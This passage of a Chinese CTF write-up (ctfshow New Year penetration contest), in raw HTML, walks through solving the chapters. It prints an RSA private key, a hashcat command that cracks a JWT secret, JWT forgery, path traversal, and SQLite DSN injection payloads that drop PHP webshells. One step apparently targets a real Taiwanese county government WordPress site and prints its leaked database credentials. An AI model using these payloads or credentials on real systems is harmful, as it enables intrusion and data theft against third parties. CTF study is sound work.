class="line">nIFIRCWHpJU7sHJqIP5vzV8KNJtbxgR+dhszdg+NhoBDUpxoVN5lzSKr2TMOLFLZ</span><br><span class="line">aQR9AWOV/aHV8gjTkTLDZfc+XlfhxiDMTQdiUTbk/tynpt+JFrDA8vL5/TOmuxgu</span><br><span class="line">mqgXZIPGrIUbwloTYyHD/XXmvXu5KE8g3eMKgxNxuEKM5bMTESBK9A7Q2Kj3eNp0</span><br><span class="line">Rvb5Aleg7h8/YbQemGelY/o5xpUyHgHjsfNQ3j/xhdhVCNVaXZF64V/YVpvC9Cq2</span><br><span class="line">9F7qI+bl6FlN7zSpuHB3QgNS1uXOmjBCsA7ypZoWmdXeaLIO+I3kP48BBSmue4ni</span><br><span class="line">dJifiK/kSOcZ0iegRXV1hyZ6pYdDE7hM5V5t5tvayJ31zRQNT2ALAFeCDozVWELH</span><br><span class="line">TnphkPkQO+SOPglrVz0S1dXicqRofXWMj7PJOFkBpWIX0aywMIh1woEAawUs3RM2</span><br><span class="line">pfLUNtqUTfodSCmWlwcpGrBWG5NACx7csPFtzWn8oPZfzL346at5DDIwD2kCAwEA</span><br><span class="line">AQKCAgA+oGYD2DQqVrIYT50rT8FNs5n2z5rOT/rWpvlI7cU+XB0dMhO19SMmGPTd</span><br><span class="line">rkM4AkfqIV+J/Egkh7qp87PTO74SxHldeh5urHd7daAjA6lgYXUoIMP9czjsg2Kq</span><br><span class="line">0vK05ApGB5tBRkmBp9qnIE4fHwxBmdb7pyehQHBUfnfHUah7SsX8ec0Ivji0FhhW</span><br><span class="line">VUfR9zfOvBnL2M67TvuGN4X2jR8EQV4uqE2BZU3LADg+vgBsD+dmBr9lWcQ97To1</span><br><span class="line">LTivANSrvrmLyGfHlNmpIM6NPa9zaRyXn9ucvpAHMaWH4HTwrghVcHpNOAjIK0rb</span><br><span class="line">jJEYp1MvKg5zk0BXrzWTh+mQ3Ov+NXrbdDspmeZsY02SuyPheOBHHHs7cHANPcRH</span><br><span class="line">1Nl/nxXkRF9H+oSOmTQi7wjZbhrEFFCeCK2TuT8vyf0p+lQMPEc+cAFn5rSXnhii</span><br><span class="line">W2Mq6nwx5Nbllr/hj7oVeyGrUZFskvbZnYYVM4NTFqUPBzQbBuQTGGfccZc9OrJx</span><br><span class="line">2qpDZdUknQe9ZI742c2vZRTqY2yZX6InR8JoQbmscke4LRdUMHH6G/PbfkqPXfFy</span><br><span class="line">r5mxscghP+kRFj86dyL03CB039N23xCNezK/AGE/6JzJgwpvUPaYtvnIuhSFQEmH</span><br><span class="line">DGrYYrDXSbwTT0ufM/tIEuHMHXT4DYX3nm94SG8wB/b3zpFdAQKCAQEA+56kjWCg</span><br><span class="line">Wcjo+QUgp50+BIa5hkFoV16QOCQEsqh+s5rhVMke7svuo5+U6C/rNFIkpR1iKRPL</span><br><span class="line">3LOqJ8B5P7ZAPdhbHAPjdtnUDbPzM1r0RYpjbJPh4AcRVqhDTWy20Yd7iZN9mHxH</span><br><span class="line">SKBZ4Txn20gvkHamPVlPMejsDRpDoauS/euzn2GlG9GPq7i5vHwQiy6sYZAPm9Ey</span><br><span class="line">z+XxsQNiqB32tHnZqYrj/GS64Jx6eaa5MdSCLIPkHHWAUHzBQ5A8/bNTFf8VAYri</span><br><span class="line">R9GnTZF8oSNne6oD62IYVzDH2wWOWSnUKdAdsnaahJLvHQnWbz6itWPWj+2TrjLS</span><br><span class="line">nl9Tz7uuhrRjcQKCAQEAnexbL5Sov7N4W7BrZZao8cKEnM6goDpUjqgEnlIG4FF+</span><br><span class="line">UVmBzuAYNlLjOXW7fKK6nt5q95R1AA72FpfOHbZnTTYHm9u1zUecIeuvNVjxi9sw</span><br><span class="line">hmhMn43pxaQcUfgWSsCrqH+8SrVEz8Lc7V2lbswx/V94PC8Za7ZLSr+FOz6X7C71</span><br><span class="line">sLQR8XI3SkrZIkmL150N8LO4WdKAtKKIfvz7Lo2xLxpGLNJ3Xf/NW51wMs5BwQNz</span><br><span class="line">EUWRUmkgCmeU74m47TCSOj580qLLT0Hxj1jRhecZOs0DHqDCeHt0hz82EtOcw1TB</span><br><span class="line">JKTly3Xj/UjGRpzEmo8rAuU8XoKc/NkmaZCjpxh/eQKCAQEArbI5E+OFLhXURbs1</span><br><span class="line">bJ/OpR8/yR8z4URFOIwcthw8ws2DCZ2A/gXHaiqKh7I0oryl0Vm0Xnjs/SEFsEVd</span><br><span class="line">Lg8oz8igNHm2t1/t07vKgkQiZjL/KX/4qEcYwAKN20/V8FSfgjxPskjwiIExKpwh</span><br><span class="line">ca2mMArH/Ye+dMy+zti3oU4ovaLNL5Qff1Gt5TQy+5uFbB8/HmZtb/n9IqkwrCqT</span><br><span class="line">G0z79mA7Up+vfJcork82+O2P4Ic7iXFOshqnBmjonTRf9h6pl4CsRpFSXZOr848g</span><br><span class="line">QriHAkY+SGpCNUZWYKq4NnL6pBanuX/IcQZhjGEzJz5M4fzWrCqsDM/Gt09FMxzz</span><br><span class="line">gMfb8QKCAQEAhnF+W65yTulKELzLYWv2ngLchOY/xsiBzgTqEaKBahzWrgjGQsly</span><br><span class="line">s2SzPuqk14Ft4Ow3IljHlmomRKut9IuhvBDAP4a3anCJUjNkMMVstYS/9dz7RmY5</span><br><span class="line">W2HQHlRXHgKS4NsGAI/7aehZztYHjaDW+f55zLrIKHPD+3m6weoSyiZcUberAuMa</span><br><span class="line">gOvhmJgGLmPtRzqpOgbEPYOVMo7KhCJqclAq5+OxbVvlhxYsO4RuZBQ8tLqF8iO+</span><br><span class="line">/DychaS4w2yzQFSMTYH8FZhtPnz9usI4L1/zRPLVPF7VoIJG1ZZDgeM4nqqnWyQd</span><br><span class="line">GTcIXXr+wRobItbnIwqM/ZEca4iQWiO3+QKCAQAjp153c8JvZhR3Stan0bKYHzMm</span><br><span class="line">FWEUjmygq6xgzclvkWWYmHwHvYjO4tITXHSmEt5GrUY/W1LOA0x9HRMUh7p71tw6</span><br><span class="line">7ni/lELMlT6Sk3b32SRoftEr5SmNEZlXPh2UYC260FkXNj3hhShv7DAZyV2bthqk</span><br><span class="line">YV63M7neAAU5YPmq0uvMvxHv1D17bswwbiJ3mzb/E4CSR2gDkKrZGshtJbKUtLvb</span><br><span class="line">wEigkCIjw+UFRhLiK4R+OIL7bZtE2unbYWeL1h4w1BLwFJPg/26Gnq91V96GwoKf</span><br><span class="line">JiAEy9wfJBnCwJPdr9OV9GGrMfBRF8Rkl6YyvNNb21C6ZABBuAzWpfu0I60h</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>然后用赛博厨子解密即可。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107133135686.png" class="" title="This is an example image"><p>解得明文如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Park:</span><br><span class="line">你的行动已经暴露，24小时内迅速撤离，销毁所有资料，将现有资料统一上传到【任务中心】</span><br><span class="line">发送人：Dylan</span><br><span class="line">Park:</span><br><span class="line">总部已经为你安排新的身份，请务必在3日内抵台，你的新身份是新竹县动物保护防疫所网络安全顾问，【任务中心】账号密码和你任职单位网站的数据库用户名密码一致，请尽快修改 </span><br><span class="line">发送人：Dylan</span><br><span class="line">Park:</span><br><span class="line">【任务中心】网址已变更为 https://task.ctfer.com ，请注意修改浏览器地址栏中的链接 </span><br><span class="line">发送人：Dylan</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交park在任务中心登陆的账号密码</span><br></pre></td></tr></table></figure><p>然后我们要做的是获取任务中心的账号密码</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101072658240.png" class="" title="This is an example image"><p>上面的密文中说到过了，任务中心的账号密码和湾湾某一g*v的数据库账密是一样的，那就说明我们要去看看湾湾的g*v。这里就不贴图了，有一丢丢敏感。。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101072844550.png" class="" title="This is an example image"><p>wordpress，那就wpscan浅浅扫一下</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101081055976.png" class="" title="This is an example image"><p>发现插件版本out of date且给出了具体版本，那么去wpscan官网查查相关漏洞试试</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101081718877.png" class="" title="This is an example image"><p>尝试后直接获取敏感文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?aam-media=wp-config.php</span><br></pre></td></tr></table></figure><p>图就不贴了嘤嘤嘤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">define( &#x27;DB_USER&#x27;, &#x27;hsinchug_wp1&#x27; );</span><br><span class="line">define( &#x27;DB_PASSWORD&#x27;, &#x27;Q.4Vyj8VCiedX1KYU5g05&#x27; );</span><br></pre></td></tr></table></figure><p>拿到账密后就可以进入任务中心了。</p><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交dylan的电话号码</span><br></pre></td></tr></table></figure><p>根据任务中心中给到的信息我们可以对私钥进行掩码爆破</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101182540997.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 16500 hash.txt --custom-charset1=?l?d 4a4f7d6e8b5?1?1?10c7f</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101183239434.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoc2luY2h1Z193cDEiLCJleHAiOjE3MzU4MTI2ODR9.vwzjhUY2xVSdKrdG2KznZ-kWWLBHvE7KTtLtFr4bRBo:4a4f7d6e8b5e3a0c7f</span><br></pre></td></tr></table></figure><p>抓显示电话号码的包，然后改JWT即可。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101183305907.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在任务中心服务器上搜索秘密账户，用户名好像是root，提交他的密码</span><br><span class="line"></span><br><span class="line">非系统用户root 是web里面的用户名root</span><br></pre></td></tr></table></figure><p>然后注销，登陆的时候抓包狂改jwt</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101184432121.png" class="" title="This is an example image"><p>然后就多了一个administrator界面！！</p><p>抓包获取三个接口：</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101184907151.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101184915535.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101184935859.png" class="" title="This is an example image"><p>listTaskFiles接口好像可以获得目录文件？？试试看</p><p>&#x2F;getServerInfo获取内网地址</p><p>&#x2F;downloadTaskFile通过url下载文件，既然有内网地址和目录了，那么我们是不是就可以下载文件了？！</p><p>但是试了一下不太行，后来发现在listTaskFiles的bp dashboard处直接改包发包以后，浏览器上显示文件，然后直接读就行</p><p>多了一个路由</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101185518497.png" class="" title="This is an example image"><p>这个taskfiles目录下没啥东西。。。读到都是没用的，那就说明需要目录穿越。</p><p>尝试了..&#x2F;，发现过滤了，没办法</p><p>尝试置空，读取到上一级，但应该是根目录，这就不知道了</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101190115408.png" class="" title="This is an example image"><p>发现一个init_users.json，直接读</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101190237762.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7y.(sc#Ac_</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交 DATABASE_SECRET_KEY内容</span><br></pre></td></tr></table></figure><p>然后看下一关，<strong>提交 DATABASE_SECRET_KEY内容</strong></p><p>先看看main.py.bak文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> url_for, redirect</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename, join</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log server is running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;user&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span> + logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span> + logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>, basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_log_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>读了也没很大的用处。题目是横向渗透，之前给了一个内网ip 172.2.233.4，莫非是扫c段？</p><p>我勒个豆？？随便改了一位直接出了。。。环境变了一次，所以172.2.233.4变为172.2.45.4</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101191643733.png" class="" title="This is an example image"><h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">跳岛战术</span><br><span class="line">拿到config.php中的数据库密码</span><br></pre></td></tr></table></figure><p>跳岛战术，被困了好久</p><p>8888端口开放了一个flask的服务</p><p>然后看看php代码</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107152415587.png" class="" title="This is an example image"><p>这台机器是php环境，config.php估计就在这台机子上了。</p><p>GET传参，四个参数，username、password、dsn、query</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username=meteorkai&amp;password=mateorkai&amp;dsn=sqlite:aa.php&amp;query=CREATE TABLE bad (name TEXT);</span><br><span class="line"></span><br><span class="line">%3Fusername%3Dmeteorkai%26password%3Dmateorkai%26dsn%3Dsqlite%3Aaa.php%26query%3DCREATE%20TABLE%20bad%20%28name%20TEXT%29%3B</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?username=meteorkai&amp;password=mateorkai&amp;dsn=sqlite:aa.php&amp;query=INSERT INTO bad (name) VALUES (&#x27;&lt;?php file_put_contents(&quot;cmd.php&quot;,&quot;&lt;?php system(\$_GET[0]);?&gt;&quot;);?&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">%3Fusername%3Dmeteorkai%26password%3Dmateorkai%26dsn%3Dsqlite%3Aaa.php%26query%3DINSERT%20INTO%20bad%20%28name%29%20VALUES%20%28%27%3C%3Fphp%20file_put_contents%28%22cmd.php%22%2C%22%3C%3Fphp%20system%28%5C%24_GET%5B0%5D%29%3B%3F%3E%22%29%3B%3F%3E%27%29%3B</span><br><span class="line"></span><br><span class="line">%3fdsn=sqlite:shell.php%26username=aaa%26password=bbb%26query=create%20table%20&quot;aaa&quot;%20(name%20TEXT%20DEFAULT%20&quot;&lt;?php%20file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;);?&gt;&quot;);</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107163450520.png" class="" title="This is an example image"><p>sqlite的每一个数据库其实都是一个文件，第一个命令是创建一个bad表并有字段name，这会被记录到php文件中去。第二个命令相当于往name字段写入一个后门，那么就会在php文件中出现，然后我们访问aa.php，就会触发php代码，从而产生后门</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107165825230.png" class="" title="This is an example image"><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250107165902352.png" alt="image-20250107165902352" style="zoom:80%;" /><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107165902352.png" class="" title="This is an example image"><p>成功获得config.php中数据库密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$database_host = &quot;localhost&quot;;</span><br><span class="line">$database_user = &quot;root&quot;;</span><br><span class="line">$database_password = &quot;3f7a1d5a-d55d-4d9d-8d9a-d5d5d5d5d5d5&quot;;</span><br><span class="line">$database_name = &quot;web_db_2&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">提交park在2024年12月27日19时20分收到的邮件中的数字</span><br><span class="line"></span><br><span class="line">格式 ctfshow&#123;数字&#125;</span><br><span class="line"></span><br><span class="line">也可以提交 163邮箱的账号密码 格式 ctfshow&#123;账号_密码&#125;</span><br></pre></td></tr></table></figure><p>然后我们看看根目录，发现存在一个secret.txt文件，查看一下。</p><p>获得一串base64编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YUdGamEyVnlYMk4wWm5Ob2IzZEFNVFl6TG1OdmJTOUk=</span><br><span class="line">WVdOclpYSmZZM1JtYzJnd2R3PT0=</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGFja2VyX2N0ZnNob3dAMTYzLmNvbS9I</span><br><span class="line">YWNrZXJfY3Rmc2gwdw==</span><br></pre></td></tr></table></figure><p>解码后拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker_ctfshow@163.com/Hacker_ctfsh0w</span><br></pre></td></tr></table></figure><p>邮箱号加密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;hacker_ctfshow@163.com_Hacker_ctfsh0w&#125;</span><br></pre></td></tr></table></figure><h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交log_server_key.txt内容</span><br></pre></td></tr></table></figure><p>本章的重点是flask服务器，之前我们看到过源码，在8888端口</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107165937711.png" class="" title="This is an example image"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> url_for, redirect</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename, join</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log server is running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;user&#x27;</span>] != <span 